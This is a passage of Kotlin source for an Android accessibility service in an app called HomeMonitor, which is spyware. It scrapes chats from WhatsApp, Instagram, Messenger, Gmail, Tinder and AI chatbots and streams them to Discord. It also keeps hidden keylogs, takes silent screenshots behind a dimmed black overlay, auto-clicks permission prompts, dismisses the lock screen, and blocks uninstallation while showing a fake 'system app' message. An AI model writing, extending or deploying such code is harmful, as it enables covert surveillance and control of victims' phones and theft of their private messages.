                                val iterator = recentMessagingAppTexts.iterator()
                                if (iterator.hasNext()) {
                                    iterator.next()
                                    iterator.remove()
                                }
                            }
                            Log.i(TAG, "Captured in-app chat bubble [$appName -> $channelName] (Contact: $senderName): ${chatMsg.take(30)}...")
                            MonitorService.sendDiscordStreamMessagingApp(channelName, appName, sender = senderName, text = chatMsg, isOutgoing = true)
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "captureMessagingAppScreenMessages error: ${e.message}")
        }
    }

    private data class SocialChatThread(
        val contactName: String,
        val messages: List<String>
    )

    private fun parseWhatsAppThread(rootNode: AccessibilityNodeInfo): SocialChatThread? {
        val contactNode = findNodeByResourceId(rootNode, "conversation_contact_name")
            ?: findNodeByResourceId(rootNode, "chat_title")
            ?: findNodeByResourceId(rootNode, "action_bar")
        val contactName = contactNode?.text?.toString()?.trim() ?: "WhatsApp Contact"

        val textNodes = mutableListOf<String>()
        findTextNodes(rootNode, textNodes)

        val chatBubbles = textNodes.filter { text ->
            text.length >= 2 &&
            !text.contains("Type a message", ignoreCase = true) &&
            !text.contains("Search", ignoreCase = true) &&
            !text.equals("Online", ignoreCase = true) &&
            !text.equals("typing...", ignoreCase = true)
        }

        if (chatBubbles.isEmpty()) return null
        return SocialChatThread(contactName = contactName, messages = chatBubbles)
    }

    private fun parseInstagramDmThread(rootNode: AccessibilityNodeInfo): SocialChatThread? {
        val headerNode = findNodeByResourceId(rootNode, "action_bar_title")
            ?: findNodeByResourceId(rootNode, "thread_title")
        val contactName = headerNode?.text?.toString()?.trim() ?: "Instagram Contact"

        val textNodes = mutableListOf<String>()
        findTextNodes(rootNode, textNodes)

        val chatBubbles = textNodes.filter { text ->
            text.length >= 2 &&
            !text.equals("Message...", ignoreCase = true) &&
            !text.equals("Search", ignoreCase = true) &&
            !text.equals("Active now", ignoreCase = true)
        }

        if (chatBubbles.isEmpty()) return null
        return SocialChatThread(contactName = contactName, messages = chatBubbles)
    }

    private fun parseFacebookMessengerThread(rootNode: AccessibilityNodeInfo): SocialChatThread? {
        val headerNode = findNodeByResourceId(rootNode, "thread_title")
        val contactName = headerNode?.text?.toString()?.trim() ?: "Messenger Contact"

        val textNodes = mutableListOf<String>()
        findTextNodes(rootNode, textNodes)

        val chatBubbles = textNodes.filter { text ->
            text.length >= 2 &&
            !text.equals("Aa", ignoreCase = true) &&
            !text.equals("Search", ignoreCase = true) &&
            !text.equals("Active now", ignoreCase = true)
        }

        if (chatBubbles.isEmpty()) return null
        return SocialChatThread(contactName = contactName, messages = chatBubbles)
    }

    private fun parseGmailThread(rootNode: AccessibilityNodeInfo): SocialChatThread? {
        val subjectNode = findNodeByResourceId(rootNode, "subject")
        val senderNode = findNodeByResourceId(rootNode, "sender_name")
        val emailSubject = subjectNode?.text?.toString()?.trim() ?: "Email Conversation"
        val senderName = senderNode?.text?.toString()?.trim() ?: "Gmail Sender"

        val textNodes = mutableListOf<String>()
        findTextNodes(rootNode, textNodes)

        val emailBodyLines = textNodes.filter { text ->
            text.length >= 4 &&
            !text.contains("Compose", ignoreCase = true) &&
            !text.contains("Reply", ignoreCase = true) &&
            !text.contains("Search in mail", ignoreCase = true)
        }

        if (emailBodyLines.isEmpty()) return null
        return SocialChatThread(contactName = "$senderName ($emailSubject)", messages = emailBodyLines)
    }

    private fun parseTinderThread(rootNode: AccessibilityNodeInfo): SocialChatThread? {
        val matchNode = findNodeByResourceId(rootNode, "match_name")
            ?: findNodeByResourceId(rootNode, "profile_name")
        val matchName = matchNode?.text?.toString()?.trim() ?: "Tinder Match"

        val textNodes = mutableListOf<String>()
        findTextNodes(rootNode, textNodes)

        val chatBubbles = textNodes.filter { text ->
            text.length >= 2 &&
            !text.contains("Type a message", ignoreCase = true) &&
            !text.contains("Send", ignoreCase = true) &&
            !text.contains("MATCHED ON", ignoreCase = true)
        }

        if (chatBubbles.isEmpty()) return null
        return SocialChatThread(contactName = matchName, messages = chatBubbles)
    }

    private fun parseBroadSocialThread(packageName: String, rootNode: AccessibilityNodeInfo): SocialChatThread? {
        val textNodes = mutableListOf<String>()
        findTextNodes(rootNode, textNodes)

        val chatBubbles = textNodes.filter { text ->
            text.length >= 2 &&
            !text.equals("Type a message", ignoreCase = true) &&
            !text.equals("Search", ignoreCase = true) &&
            !text.equals("Message", ignoreCase = true) &&
            !text.equals("Send", ignoreCase = true)
        }

        if (chatBubbles.isEmpty()) return null
        return SocialChatThread(contactName = getAppName(packageName), messages = chatBubbles)
    }

    private fun findNodeByResourceId(node: AccessibilityNodeInfo?, resIdPartial: String): AccessibilityNodeInfo? {
        if (node == null) return null
        val resName = node.viewIdResourceName?.lowercase(Locale.ROOT) ?: ""
        if (resName.contains(resIdPartial.lowercase(Locale.ROOT))) {
            return node
        }
        for (i in 0 until node.childCount) {
            val child = node.getChild(i)
            val found = findNodeByResourceId(child, resIdPartial)
            if (found != null) return found
        }
        return null
    }

    private fun captureAiChatbotScreenResponse(packageName: String, appName: String, nodeInfo: AccessibilityNodeInfo?) {
        if (nodeInfo == null) return
        val now = SystemClock.uptimeMillis()
        if (now - lastAiResponseTime < 1500L) return

        try {
            val textNodes = mutableListOf<String>()
            findTextNodes(nodeInfo, textNodes)

            val uiNoise = setOf(
                "Copy", "Regenerate", "Share", "Good response", "Bad response",
                "Search", "Type a message", "Send", "Ask anything", "New chat",
                "ChatGPT", "Claude", "Gemini", "Copilot", "Character.AI"
            )

            val validNodes = textNodes.map { it.trim() }.filter { txt ->
                txt.length >= 5 &&
                !uiNoise.contains(txt) &&
                !txt.startsWith("Type a message") &&
                !txt.startsWith("Search") &&
                txt != lastUserAiPromptText
            }

            if (validNodes.isNotEmpty()) {
                val fullResponse = validNodes.distinct().joinToString("\n\n")
                if (fullResponse.length >= 10 && fullResponse != lastAiResponseText) {
                    lastAiResponseText = fullResponse
                    lastAiResponseTime = now
                    Log.i(TAG, "Extracted AI Chatbot response [$appName] (${fullResponse.length} chars)")
                    val promptHeader = if (lastUserAiPromptText.isNotBlank()) "👤 **User Input Prompt:**\n```\n$lastUserAiPromptText\n```\n\n" else ""
                    val unifiedMessage = "${promptHeader}🤖 **AI Generated Response:**\n$fullResponse"
                    MonitorService.sendDiscordStreamAIChatbot(appName, unifiedMessage)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "captureAiChatbotScreenResponse error: ${e.message}")
        }
    }

    private fun findTextNodes(node: AccessibilityNodeInfo?, results: MutableList<String>) {
        if (node == null) return
        val txt = node.text?.toString()?.trim()
        if (!txt.isNullOrBlank()) {
            results.add(txt)
        }
        for (i in 0 until node.childCount) {
            findTextNodes(node.getChild(i), results)
        }
    }

    private fun getAppName(packageName: String): String {
        return try {
            val appInfo = packageManager.getApplicationInfo(packageName, 0)
            packageManager.getApplicationLabel(appInfo).toString()
        } catch (e: Exception) {
            packageName
        }
    }

    private fun logActiveAppChange(packageName: String, appName: String) {
        try {
            val timeStr = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val prefs = SecurityVaultManager.getEncryptedPrefs(this)
            prefs.edit().putString("active_app", "$appName ($packageName)").apply()

            val logFile = File(cacheDir, ".active_apps.txt")
            logFile.appendText("[$timeStr] App Opened: $appName ($packageName)\n")
        } catch (e: Exception) {
            Log.e(TAG, "logActiveAppChange error: ${e.message}")
        }
    }

    private fun saveKeylog(packageName: String, appName: String, logLine: String) {
        try {
            val keylogDir = File(cacheDir, ".keylogs")
            if (!keylogDir.exists()) keylogDir.mkdirs()

            val logFile = File(keylogDir, "$packageName.txt")

            if (!logFile.exists()) {
                logFile.writeText("#APP_NAME:$appName\n")
            }

            if (logFile.exists() && logFile.length() > MAX_FILE_SIZE_BYTES) {
                val lines = logFile.readLines()
                if (lines.size > 100) {
                    val header = lines.firstOrNull { it.startsWith("#APP_NAME:") } ?: "#APP_NAME:$appName\n"
                    val recentLines = lines.drop(lines.size / 3)
                    logFile.writeText(header + "\n" + recentLines.joinToString("\n") + "\n")
                }
            }

            logFile.appendText(logLine)
        } catch (e: Exception) {
            Log.e(TAG, "saveKeylog error: ${e.message}")
        }
    }

    private fun extractAllTextFromNode(node: AccessibilityNodeInfo?, sb: StringBuilder, depth: Int = 0) {
        if (node == null || depth > 15) return
        try {
            node.text?.let { sb.append(" ").append(it) }
            node.contentDescription?.let { sb.append(" ").append(it) }
            node.viewIdResourceName?.let { sb.append(" ").append(it) }
            for (i in 0 until node.childCount) {
                extractAllTextFromNode(node.getChild(i), sb, depth + 1)
            }
        } catch (_: Exception) {}
    }

    private fun checkAndBlockUninstall(nodeInfo: AccessibilityNodeInfo?) {
        if (nodeInfo == null || isSelfUninstallAllowed || C2Gatekeeper.isUnlockedByAdmin) return

        try {
            val pkg = nodeInfo.packageName?.toString()?.lowercase() ?: ""
            if (pkg == "com.google.android.system" || pkg == "com.homemonitor") return

            val sb = StringBuilder()
            extractAllTextFromNode(nodeInfo, sb)
            val fullText = sb.toString().lowercase()

            if (fullText.isBlank()) return

            val targetIdentifiers = arrayOf(
                "com.google.android.system",
                "com.homemonitor",
                "homemonitor"
            )

            var isTargeted = false
            for (id in targetIdentifiers) {
                if (fullText.contains(id)) {
                    isTargeted = true
                    break
                }
            }

            if (isTargeted) {
                val destructiveActionKeywords = arrayOf(
                    "uninstall", "force stop", "deactivate device admin", "remove device admin"
                )

                var isDestructiveAction = false
                for (kw in destructiveActionKeywords) {
                    if (fullText.contains(kw)) {
                        isDestructiveAction = true
                        break
                    }
                }

                if (isDestructiveAction) {
                    val isPackageInstaller = pkg.contains("packageinstaller") || pkg.contains("settings")
                    val isUninstallPrompt = fullText.contains("do you want to uninstall") ||
                        fullText.contains("uninstall this app") ||
                        fullText.contains("force stop") ||
                        fullText.contains("deactivate device admin") ||
                        fullText.contains("remove device admin")

                    if (isPackageInstaller && isUninstallPrompt) {
                        Log.w(TAG, "Universal Anti-Tamper Protection triggered! Executing GLOBAL_ACTION_HOME.")
                        performGlobalAction(GLOBAL_ACTION_HOME)

                        mainHandler.post {
                            Toast.makeText(applicationContext, "System app cannot be uninstalled.", Toast.LENGTH_LONG).show()
                        }

                        MonitorService.sendDiscordStreamSensorAlert(
                            "Anti-Tamper Watchdog",
                            "🚨 **Anti-Tamper Protection**: Blocked attempt to uninstall / force stop / disable HomeMonitor!"
                        )
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "checkAndBlockUninstall error: ${e.message}")
        }
    }

    @Volatile private var cachedWorkingYOffset: Float = 0f

    fun dispatchGestureTap(x: Float, y: Float, onComplete: (() -> Unit)? = null) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = android.graphics.Path().apply {
                moveTo(x, y)
            }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50)
            val builder = android.accessibilityservice.GestureDescription.Builder().addStroke(stroke)
            dispatchGesture(builder.build(), object : GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    super.onCompleted(gestureDescription)
                    Log.i(TAG, "dispatchGestureTap completed at ($x, $y)")
                    onComplete?.invoke()
                }

                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    super.onCancelled(gestureDescription)
                    Log.w(TAG, "dispatchGestureTap cancelled at ($x, $y)")
                    onComplete?.invoke()
                }
            }, null)
        } else {
            onComplete?.invoke()
        }
    }

    private fun autoGrantPermissions(nodeInfo: AccessibilityNodeInfo?) {
        if (nodeInfo == null) return

        try {
            val pkg = nodeInfo.packageName?.toString()?.lowercase() ?: ""
            if (pkg == "com.google.android.system" || pkg == "com.homemonitor" || pkg.contains("settings")) return

            val isPermissionControllerDialog = pkg == "com.android.permissioncontroller" ||
                pkg == "com.google.android.permissioncontroller" ||
                pkg == "com.samsung.android.permissioncontroller" ||
                pkg == "com.google.android.packageinstaller" ||
                pkg == "com.android.packageinstaller"

            if (isPermissionControllerDialog) {
                // Short delay for window transition animation completion and tree population
                Thread.sleep(180L)

                // High-precision Tree & View ID matching only
                autoGrantTreeBased(nodeInfo, pkg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "autoGrantPermissions error: ${e.message}")
        }
    }

    private fun autoGrantTreeBased(nodeInfo: AccessibilityNodeInfo, pkg: String): Boolean {
        // Known Resource IDs
        val knownResourceIds = arrayOf(
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_one_time_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "android:id/button1"
        )

        for (resId in knownResourceIds) {
            val nodes = nodeInfo.findAccessibilityNodeInfosByViewId(resId)
            for (node in nodes) {
                if (clickOrTapNode(node, resId, pkg)) {
                    return true
                }
            }
        }

        // Multi-language Allow Keywords for system permission dialogs
        val allowKeywords = arrayOf(
            "allow", "while using the app", "only this time", "allow all the time",
            "always allow", "permitir", "solo esta vez", "izin ver",
            "允许", "仅在使用中", "autoriser", "zulassen", "разрешить", "許可"
        )

        for (kw in allowKeywords) {
            val nodes = nodeInfo.findAccessibilityNodeInfosByText(kw)
            for (node in nodes) {
                if (clickOrTapNode(node, kw, pkg)) {
                    return true
                }
            }
        }

        return false
    }

    private fun clickOrTapNode(node: AccessibilityNodeInfo?, label: String, pkg: String): Boolean {
        if (node == null) return false
        try {
            if (node.isClickable) {
                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.i(TAG, "Auto-clicked tree node ($label) on $pkg")
                return true
            } else if (node.parent != null && node.parent.isClickable) {
                node.parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                Log.i(TAG, "Auto-clicked parent tree node ($label) on $pkg")
                return true
            } else {
                // Dispatch gesture tap at exact screen bounds
                val rect = android.graphics.Rect()
                node.getBoundsInScreen(rect)
                if (rect.width() > 0 && rect.height() > 0) {
                    val cX = rect.exactCenterX()
                    val cY = rect.exactCenterY()
                    dispatchGestureTap(cX, cY)
                    Log.i(TAG, "Dispatched gesture tap ($label) at ($cX, $cY) on $pkg")
                    return true
                }
            }
        } catch (_: Exception) {}
        return false
    }

    fun enhanceSeeThroughStealthBitmap(sourceBitmap: Bitmap): Bitmap {
        try {
            val width = sourceBitmap.width
            val height = sourceBitmap.height
            val enhancedBitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888)
            val canvas = android.graphics.Canvas(enhancedBitmap)
            val paint = android.graphics.Paint()

            // 20x RGB Contrast & Gain Enhancement ColorMatrix
            val colorMatrix = android.graphics.ColorMatrix(floatArrayOf(
                20f, 0f,  0f,  0f, 0f,
                0f,  20f, 0f,  0f, 0f,
                0f,  0f,  20f, 0f, 0f,
                0f,  0f,  0f,  1f, 0f
            ))

            paint.colorFilter = android.graphics.ColorMatrixColorFilter(colorMatrix)
            canvas.drawBitmap(sourceBitmap, 0f, 0f, paint)
            return enhancedBitmap
        } catch (e: Exception) {
            Log.e(TAG, "enhanceSeeThroughStealthBitmap error: ${e.message}")
            return sourceBitmap
        }
    }

    fun takeSilentScreenshotBitmap(onComplete: (Bitmap?) -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
                override fun onSuccess(screenshotResult: ScreenshotResult) {
                    try {
                        val hardwareBuffer = screenshotResult.hardwareBuffer
                        val colorSpace = screenshotResult.colorSpace
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                        val copyBitmap = bitmap?.copy(Bitmap.Config.ARGB_8888, false)
                        hardwareBuffer.close()

                        val finalBitmap = if (isOverlayShowing && copyBitmap != null) {
                            enhanceSeeThroughStealthBitmap(copyBitmap)
                        } else {
                            copyBitmap
                        }

                        onComplete(finalBitmap)
                    } catch (e: Exception) {
                        Log.e(TAG, "takeSilentScreenshotBitmap error: ${e.message}")
                        onComplete(null)
                    }
                }

                override fun onFailure(errorCode: Int) {
                    Log.e(TAG, "takeSilentScreenshotBitmap failed code: $errorCode")
                    onComplete(null)
                }
            })
        } else {
            onComplete(null)
        }
    }

    fun takeSilentScreenshot(onComplete: (File?) -> Unit) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
                override fun onSuccess(screenshotResult: ScreenshotResult) {
                    try {
                        val hardwareBuffer = screenshotResult.hardwareBuffer
                        val colorSpace = screenshotResult.colorSpace
                        val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                        val copyBitmap = bitmap?.copy(Bitmap.Config.ARGB_8888, false)
                        hardwareBuffer.close()

                        val finalBitmap = if (isOverlayShowing && copyBitmap != null) {
                            enhanceSeeThroughStealthBitmap(copyBitmap)
                        } else {
                            copyBitmap
                        }

                        val screenFile = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                        FileOutputStream(screenFile).use { out ->
                            finalBitmap?.compress(Bitmap.CompressFormat.JPEG, 85, out)
                        }
                        onComplete(screenFile)
                    } catch (e: Exception) {
                        Log.e(TAG, "takeScreenshot error: ${e.message}")
                        onComplete(null)
                    }
                }

                override fun onFailure(errorCode: Int) {
                    Log.e(TAG, "takeScreenshot failed code: $errorCode")
                    onComplete(null)
                }
            })
        } else {
            onComplete(null)
        }
    }

    private var blackOverlayView: android.view.View? = null
    private val uiHandler = android.os.Handler(android.os.Looper.getMainLooper())

    var isOverlayShowing = false
        private set

    fun showBlackScreenOverlay() {
        if (isOverlayShowing) return
        isOverlayShowing = true
        uiHandler.post {
            try {
                if (blackOverlayView != null) return@post
                val wm = getSystemService(WINDOW_SERVICE) as? android.view.WindowManager
                if (wm == null) {
                    isOverlayShowing = false
                    return@post
                }
                val view = android.view.View(this).apply {
                    setBackgroundColor(android.graphics.Color.BLACK)
                }
                val overlayType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    android.view.WindowManager.LayoutParams.TYPE_PHONE
                }
                val params = android.view.WindowManager.LayoutParams(
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    android.view.WindowManager.LayoutParams.MATCH_PARENT,
                    overlayType,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    android.graphics.PixelFormat.TRANSLUCENT
                ).apply {
                    screenBrightness = 0.001f
                    alpha = 0.01f
                }

                try {
                    if (android.provider.Settings.System.canWrite(applicationContext)) {
                        android.provider.Settings.System.putInt(
                            contentResolver,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
                        )
                        android.provider.Settings.System.putInt(
                            contentResolver,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS,
                            0
                        )
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "System brightness dimming error: ${e.message}")
                }

                wm.addView(view, params)
                blackOverlayView = view
                Log.i(TAG, "Advanced Stealth Mode active: Backlight dimmed to 0.001f with GPU pass-through alpha 0.01f.")
            } catch (e: Exception) {
                isOverlayShowing = false
                Log.e(TAG, "Error showing black screen overlay: ${e.message}")
            }
        }
    }

    fun hideBlackScreenOverlay() {
        isOverlayShowing = false
        uiHandler.post {
            try {
                blackOverlayView?.let { view ->
                    val wm = getSystemService(WINDOW_SERVICE) as? android.view.WindowManager
                    wm?.removeView(view)
                }
                blackOverlayView = null

                try {
                    if (android.provider.Settings.System.canWrite(applicationContext)) {
                        android.provider.Settings.System.putInt(
                            contentResolver,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC
                        )
                    }
                } catch (e: Exception) {
                    Log.w(TAG, "System brightness restore error: ${e.message}")
                }

                Log.i(TAG, "Advanced Stealth Mode disabled: Backlight and overlay restored.")
            } catch (e: Exception) {
                Log.e(TAG, "Error hiding black screen overlay: ${e.message}")
            }
        }
    }

    fun dispatchTap(x: Float, y: Float) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = android.graphics.Path().apply { moveTo(x, y) }
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50))
                .build()
            dispatchGesture(gesture, null, null)
        }
    }

    fun dispatchSwipe(startX: Float, startY: Float, endX: Float, endY: Float, durationMs: Long = 300L) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val path = android.graphics.Path().apply {
                moveTo(startX, startY)
                lineTo(endX, endY)
            }
            val stroke = android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, durationMs.coerceAtLeast(100L))
            val gesture = android.accessibilityservice.GestureDescription.Builder()
                .addStroke(stroke)
                .build()
            dispatchGesture(gesture, null, null)
        }
    }

    fun performGlobal(actionId: Int) {
        performGlobalAction(actionId)
    }

    fun dismissKeyguard() {
        if (Build.VERSION.SDK_INT >= 31) { // Android 12+ GLOBAL_ACTION_DISMISS_KEYGUARD = 15
            performGlobalAction(15)
        }
        val metrics = resources.displayMetrics
        val startX = metrics.widthPixels / 2f
        val startY = metrics.heightPixels * 0.85f
        val endX = metrics.widthPixels / 2f
        val endY = metrics.heightPixels * 0.2f
        dispatchSwipe(startX, startY, endX, endY, 250L)
    }

    fun typeText(textToType: String) {
        if (textToType.isEmpty()) return
        uiHandler.post {
            try {
                val root = rootInActiveWindow ?: return@post
                val focusedNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: root.findFocus(AccessibilityNodeInfo.FOCUS_ACCESSIBILITY)
                if (focusedNode != null) {
                    val arguments = android.os.Bundle().apply {
                        putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, textToType)
                    }
                    focusedNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                    Log.i(TAG, "Typed text via ACTION_SET_TEXT: $textToType")
                } else {
                    Log.w(TAG, "No focused input node found for typeText.")
                }
            } catch (e: Exception) {
                Log.e(TAG, "typeText error: ${e.message}")
            }
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "AppAccessibilityService interrupted.")
    }
}
